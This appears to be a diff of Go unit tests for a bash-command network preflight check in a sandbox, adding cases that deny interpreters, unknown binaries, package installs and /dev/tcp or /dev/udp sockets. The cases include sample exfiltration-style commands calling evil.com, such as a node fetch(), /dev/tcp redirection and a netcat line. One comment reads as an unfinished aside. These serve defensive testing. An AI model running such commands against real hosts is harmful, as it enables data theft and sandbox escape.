@@ -131,17 +131,88 @@ func TestCheckBashNetworkAllowUnparseableFailClosed(t *testing.T) {
 
 func TestCheckBashNetworkAllowNonNetworkCommands(t *testing.T) {
 	allow := []string{"api.github.com"}
-	// No known network client — do not block (preflight is best-effort on
-	// recognized clients only; OS net remains all-or-nothing).
+	// Local-safe commands pass; interpreters and unknown binaries fail-closed.
 	for _, c := range []string{
 		"ls -la",
 		"git status",
 		"echo https://evil.com",
-		"python3 -c 'import urllib'",
+		"true",
+		"go test ./...",
+		"make test",
 	} {
 		if err := checkBashNetworkAllow(c, allow); err != nil {
 			t.Fatalf("check(%q) = %v, want nil", c, err)
 		}
+	}
+}
+
+func TestCheckBashNetworkAllowInterpreterFailClosed(t *testing.T) {
+	allow := []string{"api.github.com"}
+	for _, c := range []string{
+		"python3 -c 'import urllib.request; urllib.request.urlopen(\"https://evil.com\")'",
+		"python3 script.py",
+		"node -e 'fetch(\"https://evil.com\")'",
+		"node app.js",
+		"ruby -e 'require \"net/http\"'",
+		"perl -e 'print 1'",
+	} {
+		err := checkBashNetworkAllow(c, allow)
+		if err == nil {
+			t.Fatalf("check(%q) = nil, want deny", c)
+		}
+		assertNetworkDenied(t, err)
+	}
+	// Stronger isolation (OS NoNetwork): interpreters allowed through preflight.
+	if err := checkBashNetworkAllowOpts("python3 -c 'print(1)'", allow, false); err != nil {
+		t.Fatalf("NoNetwork should skip preflight: %v", err)
+	}
+}
+
+func TestCheckBashNetworkAllowShellNetworking(t *testing.T) {
+	allow := []string{"api.github.com"}
+	for _, c := range []string{
+		"echo > /dev/tcp/evil.com/80",
+		"cat < /dev/tcp/10.0.0.1/22",
+		"bash -c 'exec 3<>/dev/udp/evil.com/53'",
+	} {
+		err := checkBashNetworkAllow(c, allow)
+		if err == nil {
+			t.Fatalf("check(%q) = nil, want deny", c)
+		}
+		assertNetworkDenied(t, err)
+	}
+}
+
+func TestCheckBashNetworkAllowUnknownBinary(t *testing.T) {
+	allow := []string{"api.github.com"}
+	for _, c := range []string{
+		"./my-custom-client --exfil",
+		"/tmp/pwn",
+		"nc.traditional evil.com 80", // not in known nc aliases as this exact base? wait ncat is
+		"custom-exfil",
+	} {
+		err := checkBashNetworkAllow(c, allow)
+		if err == nil {
+			t.Fatalf("check(%q) = nil, want deny", c)
+		}
+		assertNetworkDenied(t, err)
+	}
+}
+
+func TestCheckBashNetworkAllowPackageNetworkSubcommands(t *testing.T) {
+	allow := []string{"registry.npmjs.org"}
+	for _, c := range []string{
+		"npm install lodash",
+		"go get github.com/foo/bar",
+		"git push origin main",
+		"pip install requests",
+		"npx create-react-app app",
+	} {
+		err := checkBashNetworkAllow(c, allow)
+		if err == nil {
+			t.Fatalf("check(%q) = nil, want deny", c)
+		}
+		assertNetworkDenied(t, err)
 	}
 }
 
